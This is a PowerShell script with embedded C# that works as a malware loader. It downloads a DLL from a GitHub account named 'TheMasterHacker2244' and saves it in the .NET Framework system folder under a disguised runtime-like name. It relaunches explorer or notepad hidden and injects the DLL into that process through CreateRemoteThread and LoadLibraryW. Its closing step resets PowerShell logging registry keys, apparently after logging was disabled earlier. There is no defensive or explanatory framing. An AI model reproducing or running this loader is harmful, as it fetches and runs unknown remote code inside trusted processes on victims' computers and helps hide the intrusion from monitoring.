$ErrorActionPreference = 'SilentlyContinue'
$dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
$dllUri = "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll"
$processName = if ([Environment]::Is64BitOperatingSystem) { 'explorer' } else { 'explorer' }

# Download the DLL
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
try { Invoke-WebRequest -Uri $dllUri -OutFile $dllPath -ErrorAction Stop } catch { exit }

# Read the DLL and determine architecture
$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
$peOffset = [System.BitConverter]::ToInt32($dllBytes, 0x3C)
$machineType = [System.BitConverter]::ToUInt16($dllBytes, $peOffset + 4)
$is64BitDll = $machineType -eq 0x8664   # AMD64

# Pick target process
if ($is64BitDll) {
    $targetProcName = 'explorer'
    $targetPath = "$env:SystemRoot\explorer.exe"
} else {
    # Use 32-bit notepad on 64-bit systems
    if ([Environment]::Is64BitOperatingSystem) {
        $targetPath = "$env:SystemRoot\SysWOW64\notepad.exe"
    } else {
        $targetPath = "$env:SystemRoot\System32\notepad.exe"
    }
    $targetProcName = 'notepad'
}

# Kill existing target if needed (optional)
Get-Process -Name $targetProcName -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $targetPath } | Stop-Process -Force
Start-Sleep -Seconds 2

# C# injector
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Inj {
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
    [DllImport("kernel32")] static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
    [DllImport("kernel32")] static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    const uint TH32CS_SNAPMODULE = 0x00000008;
    const uint TH32CS_SNAPMODULE32 = 0x00000010;

    [StructLayout(LayoutKind.Sequential)]
    struct MODULEENTRY32 {
        public uint dwSize;
        public uint th32ModuleID;
        public uint th32ProcessID;
        public uint GlblcntUsage;
        public uint ProccntUsage;
        public IntPtr modBaseAddr;
        public uint modBaseSize;
        public IntPtr hModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szModule;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExePath;
    }

    static bool IsModuleLoaded(int pid, string dllName) {
        IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, (uint)pid);
        if (snapshot == (IntPtr)(-1)) return false;
        MODULEENTRY32 me = new MODULEENTRY32();
        me.dwSize = (uint)Marshal.SizeOf(me);
        if (!Module32First(snapshot, ref me)) { CloseHandle(snapshot); return false; }
        do {
            if (me.szModule.Equals(dllName, StringComparison.OrdinalIgnoreCase)) { CloseHandle(snapshot); return true; }
        } while (Module32Next(snapshot, ref me));
        CloseHandle(snapshot);
        return false;
    }

    public static bool ClassicInject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess == IntPtr.Zero) return false;
        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        uint dllSize = (uint)dllBytes.Length;
        IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); return false; }
        uint written;
        WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
        if (remoteThread == IntPtr.Zero) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); return false; }
        WaitForSingleObject(remoteThread, 0xFFFFFFFF);
        uint exitCode;
        GetExitCodeThread(remoteThread, out exitCode);
        CloseHandle(remoteThread);
        CloseHandle(hProcess);
        return exitCode != 0;
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices

# Launch target process and inject
$proc = Start-Process -FilePath $targetPath -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 2

$injected = $false
$dllName = [System.IO.Path]::GetFileName($dllPath)

for ($i=0; $i -lt 3; $i++) {
    if ([Inj]::ClassicInject($proc.Id, $dllPath)) {
        Start-Sleep -Milliseconds 500
        if ([Inj]::IsModuleLoaded($proc.Id, $dllName)) {
            $injected = $true
            break
        }
    }
    Start-Sleep -Seconds 1
}

if ($injected) { Write-Host "Injected" }

# Re-enable PowerShell logging
$basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
Set-ItemProperty -Path "$basePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force
Set-ItemProperty -Path "$basePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force
Set-ItemProperty -Path "$basePath\Transcription" -Name 'EnableTranscripting' -Value 1 -Force
$corePath = 'HKLM:\Software\Policies\Microsoft\PowerShellCore'
if (Test-Path "$corePath\ScriptBlockLogging") { Set-ItemProperty -Path "$corePath\ScriptBlockLogging" -Name 'EnableScriptBlockLogging' -Value 1 -Force }
if (Test-Path "$corePath\ModuleLogging") { Set-ItemProperty -Path "$corePath\ModuleLogging" -Name 'EnableModuleLogging' -Value 1 -Force }
